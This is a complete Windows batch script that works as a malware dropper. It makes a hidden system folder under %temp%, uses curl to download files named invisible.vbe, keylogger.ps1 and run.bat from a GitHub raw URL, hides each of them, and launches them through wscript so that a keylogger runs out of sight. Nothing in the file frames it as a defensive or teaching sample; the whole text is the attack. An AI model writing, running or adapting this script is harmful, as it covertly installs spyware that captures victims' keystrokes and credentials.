@echo off
cd %temp%
if not exist test\ (
  mkdir test
)
attrib +s +h test
cd test
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/invisible.vbe -o i.vbe
attrib +s +h i.vbe
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/keylogger.ps1 -o p.ps1
attrib +s +h p.ps1
curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/run.bat -o r.bat
attrib +s +h r.bat
wscript.exe "i.vbe" "r.bat"
